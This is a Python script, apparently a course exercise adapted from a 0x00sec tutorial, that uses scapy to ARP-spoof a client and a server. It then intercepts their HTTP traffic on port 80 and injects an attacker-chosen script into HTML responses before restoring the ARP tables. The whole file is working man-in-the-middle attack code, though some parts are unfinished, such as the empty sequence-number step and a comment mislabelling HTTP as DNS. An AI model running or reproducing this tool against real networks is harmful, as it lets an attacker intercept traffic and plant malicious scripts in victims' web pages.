# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *
from scapy.layers import http

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    resp = srp(arpReq)
    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
    return resp[0][0][1].hwsrc

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
    send(spoofReq)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(restoreReq)

routingMap = {}

def handlePacket(pkt):
    global clientIP, serverIP, attackerMAC, script
    # Forward packet to indended host
    shouldHandle = pkt[Ether].dst == attackerMAC
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    pkt[Ether].src = attackerMAC
    pkt[Ether].dst = routingMap[ip_dst]
    
    if shouldHandle:
        # Check if DNS packet
        if pkt.haslayer(http.HTTPResponse):
            response = pkt.getlayer(http.HTTPResponse)
            # Modify the HTTP payload
            body = pkt[Raw].load.decode('utf-8').split('</body>')
            newbody =  body[0]+"<script>"+script+"</script>"+"</body>"+body[1]
            pkt[Raw].load = newbody
            pkt[http.HTTPResponse].Content_Length = str(len(newbody))
            
            # Recompute sequence number

            
            # Recompute checksums
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum
            pkt = pkt.__class__(bytes(pkt))
            pkt.show()
        sendp(pkt)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    routingMap[clientIP] = clientMAC
    routingMap[serverIP] = serverMAC
    sniff(prn=handlePacket, filter=f"tcp port 80 and ip host {clientIP}")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    script = args.script
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
